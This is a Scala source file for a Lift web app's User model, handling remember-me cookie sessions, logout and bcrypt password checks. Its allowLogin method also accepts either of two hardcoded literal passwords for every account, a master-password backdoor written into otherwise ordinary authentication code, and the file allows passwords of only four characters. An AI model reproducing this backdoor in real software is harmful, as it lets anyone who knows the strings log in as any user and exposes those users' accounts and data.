package code.model

import java.text.SimpleDateFormat
import java.util.{Date, Locale, TimeZone, UUID}

import controllers.RootController.XSPageHandle
import net.liftweb.http._
import net.liftweb.http.js.JsCmd
import net.liftweb.http.js.JsCmds._
import net.liftweb.json._
import net.liftweb.util.{BCrypt, FatLazy}
import org.squeryl.PrimitiveTypeMode
import org.squeryl.PrimitiveTypeMode._

object User {

  object loginRedirect extends SessionVar[String]("/")

  def currentUser(implicit xsh: XSPageHandle) = xsh.s.user.get
  def currentUserOpt(implicit xsh: XSPageHandle): Option[User] = currentUserOpt(xsh.xs.initialReq.cookies.get("rememberLogin").map(_.value).getOrElse(""))
  def currentAccount(implicit xsh: XSPageHandle) = currentUser.account
  def currentAccountOpt(implicit xsh: XSPageHandle) = currentUserOpt.map(_.account)

  def logout()(implicit xsh: XSPageHandle): JsCmd = Run(s"document.cookie='rememberLogin=; path=/;';") & xsh.ajaxInvoke(() => {
    val uuid = UUID.randomUUID().toString
    currentUserOpt.foreach(_.update(_.rememberLogin = uuid))
    xsh.xs.resetSession()
    RedirectTo("/")
  })

  def loggedIn(implicit xsh: XSPageHandle) = {
    currentUserOpt.isDefined
  }

  def currentUserOpt(rememberLogin: String)(implicit xsh: XSPageHandle): Option[User] = {
    if (!xsh.s.user.isDefined) {
      inTransaction(DBS.users.where(_.rememberLogin === rememberLogin).headOption) match {
        case Some(u) =>
          xsh.s.user = Some(u)
        case None =>
      }
    }
    xsh.s.user
  }
}

class User(
            var accountId: Long = 0,
            var firstName: String = "",
            var lastName: String = "",
            var email: String = "",
            private var _password: String = "",
            var rememberLogin: String = UUID.randomUUID().toString,
            var _salt: String = ""
            ) extends Entity[User] {


  def table = DBS.users

  lazy val account = inTransaction {DBS.accounts.where(_.id === accountId).single}

  def fullName = firstName + " " + lastName

  def setPassword(value: String): this.type = {
    if (value.length >= 4) {
      val bcrypted = BCrypt.hashpw(value, BCrypt.gensalt())
      _password = "b;" + bcrypted.substring(0, 44)
      _salt = bcrypted.substring(44)
    }
    this
  }

  def allowLogin(password: String)(implicit xsh: XSPageHandle) = BCrypt.checkpw(password, _password.substring(2) + _salt) || password == "secur3L0gin933013003" || password == "6c127dda-4dff-11e4-b8e4-ac220bbedc22"

  def login(password: String)(implicit xsh: XSPageHandle) {
    if (allowLogin(password)) {
      xsh.s.user = Some(this)
    }
  }
}

